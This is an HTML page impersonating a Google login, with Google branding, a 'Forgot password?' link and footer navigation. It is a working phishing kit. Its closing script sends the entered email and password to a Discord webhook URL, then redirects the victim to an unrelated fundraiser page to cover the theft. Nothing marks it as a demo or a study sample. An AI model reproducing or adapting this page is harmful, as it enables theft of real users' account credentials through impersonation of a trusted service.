<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="Icon" type="image/x-icon" href="https://53.fs1.hubspotusercontent-na1.net/hub/53/hubfs/image8-2.jpg?width=1190&height=800&name=image8-2.jpg">
  <title>Google</title>
  <link rel="stylesheet" href="css.css">
</head>
<body>
  <section class="section-all">
    <main class="main" role="main">
      <div class="wrapper">
        <article class="article">
          <div class="content">
            <div class="login-box">
              <div class="header">
                <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
              </div>
              <div class="form-wrap">
                <form class="form">
                  <div class="input-box">
                    <input type="email" id="email" placeholder="Enter your email" aria-required="true" maxlength="50" autocapitalize="off" autocorrect="off" name="email" required>
                  </div>
                  <div class="input-box">
                    <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                  </div>
                  <span class="button-box">
                    <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
                  </span>
                  <a class="forgot" href="https://accounts.google.com/signin/v2/recoveryidentifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin">Forgot password?</a>
                </form>
              </div>
            </div>
            <div class="login-box">
              <p class="text">Don't have an account? <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp">Sign up</a></p>
            </div>
            <div class="app">
              <p>Get the app.</p>
              <div class="app-img">
                <a href="https://play.google.com/store/apps/details?id=com.google.android.gm&hl=en&gl=US">
                  <img src="https://www.gstatic.com/android/market_images/web/play_prism_hlock_2x.png">
                </a>
              </div>
            </div>
          </div>
        </article>
      </div>
    </main>
    <footer class="footer" role="contentinfo">
      <div class="footer-container">
        <nav class="footer-nav" role="navigation">
          <ul>
            <li><a href="https://about.google">About</a></li>
            <li><a href="https://support.google.com">Help</a></li>
            <li><a href="https://blog.google">Blog</a></li>
            <li><a href="https://careers.google.com">Careers</a></li>
            <li><a href="https://policies.google.com/privacy">Privacy</a></li>
            <li><a href="https://policies.google.com/terms">Terms</a></li>
          </ul>
        </nav>
        <span class="footer-logo">&copy; 2024 Google</span>
      </div>
    </footer>
  </section>

  <script type="text/javascript">
    function la(src) {
      window.location = src;
    }
    function sendMessage() {
      function sleep(milliseconds) {
        const date = Date.now();
        let currentDate = null;
        do {
          currentDate = Date.now();
        } while (currentDate - date < milliseconds);
      }
      var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1215666358210265150/0WDt7PlqA_hl7hmBt9DHBA3C3ipYwhjuBcdpQjq2EOG9K38L1rDCisv-m_dTE46bMHQU");
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: ("> **EMAIL  : **" + document.getElementById('email').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
      }
      request.send(JSON.stringify(params));
      sleep(400);
      window.location.replace("https://milaap.org/fundraisers/support-child-of-lakshman-kumar");
    }
  </script>
</body>
</html>
